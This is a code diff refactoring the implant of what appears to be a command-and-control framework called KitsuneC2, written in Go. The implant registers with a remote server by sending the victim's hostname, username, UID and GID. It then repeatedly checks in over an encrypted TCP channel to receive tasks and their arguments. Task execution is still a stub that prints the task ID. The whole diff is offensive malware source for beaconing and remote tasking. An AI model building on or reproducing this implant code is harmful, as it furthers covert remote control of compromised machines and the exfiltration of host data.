@@ -3,7 +3,6 @@ package main
 import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
-	"encoding/json"
 	"fmt"
 	"math"
 	"math/rand"
@@ -45,17 +44,16 @@ func kitsuneLoop() {
 
 		conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
 		if err != nil {
-
+			continue
 		}
 
-		var receivedTask *communication.Envelope
-		receivedTask, err = checkIn(conn)
+		receivedTask, taskArguments, err := checkIn(conn)
 		if err != nil {
 			conn.Close()
 			continue
 		}
 
-		executeTask(receivedTask, conn) //conn is passed so that executeTask can send a response to the server
+		executeTask(receivedTask, taskArguments, conn) //conn is passed so that executeTask can send a response to the server
 		conn.Close()
 	}
 }
@@ -67,39 +65,35 @@ func initialize() error {
 	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, implantName) //Generates unique ID based on hostname, username and implantName
 
 	msg := communication.ImplantRegister{ImplantId: implantId, ImplantName: implantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid}
-	msgBytes, _ := json.Marshal(msg)
-	envelope := communication.Envelope{MessageType: 0, Data: msgBytes}
 
 	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
 	if err != nil {
 		return err
 	}
 	defer conn.Close()
-	err = communication.SendEnvelope(conn, envelope, []byte(sessionKey))
+	err = communication.SendEnvelope(conn, 0, msg, []byte(sessionKey))
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-// Sends message of type "ImplantCheckin" to server and returns (if any) an envelope containing tasks.
-func checkIn(conn net.Conn) (*communication.Envelope, error) {
+// Sends message of type "ImplantCheckin" to server and returns (if any) a task with it's arguments.
+func checkIn(conn net.Conn) (int, []byte, error) {
 	msg := communication.ImplantCheckin{ImplantId: implantId}
-	msgBytes, _ := json.Marshal(msg)
-	envelope := communication.Envelope{MessageType: 1, Data: msgBytes}
 
-	err := communication.SendEnvelope(conn, envelope, []byte(sessionKey))
+	err := communication.SendEnvelope(conn, 1, msg, []byte(sessionKey))
 	if err != nil {
-		return nil, err
+		return -1, nil, err
 	}
 
-	receivedEnvelope, err := communication.ReceiveEnvelope(conn, []byte(sessionKey))
+	messageType, data, err := communication.ReceiveEnvelope(conn, []byte(sessionKey))
 	if err != nil {
-		return nil, err
+		return -1, nil, err
 	}
-	return receivedEnvelope, nil
+	return messageType, data, nil
 }
 
-func executeTask(envelope *communication.Envelope, conn net.Conn) {
-	fmt.Println("Executing task with ID: " + strconv.Itoa(envelope.MessageType))
+func executeTask(taskType int, arguments []byte, conn net.Conn) {
+	fmt.Println("Executing task with ID: " + strconv.Itoa(taskType))
 }
